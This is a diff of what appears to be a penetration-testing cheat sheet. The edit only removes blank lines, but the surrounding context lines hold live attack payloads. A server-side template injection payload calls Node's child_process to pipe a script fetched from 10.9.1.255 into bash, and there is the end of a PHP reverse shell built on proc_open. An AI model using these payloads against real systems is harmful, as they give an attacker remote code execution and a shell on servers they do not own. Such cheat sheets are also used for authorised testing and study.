@@ -25,8 +25,6 @@
 ## Headers
 - [Modify headers](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/)
 
-
-
 ## Server Side Template Injection
 {{7x7}}
 #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.9.1.255:5556/s.sh | bash')}()}
@@ -305,6 +303,5 @@ $descriptorspec = array(
 );
 
 $process = proc_open($shell, $descriptorspec, $pipes, null,null);
-
 ?> 
 ```
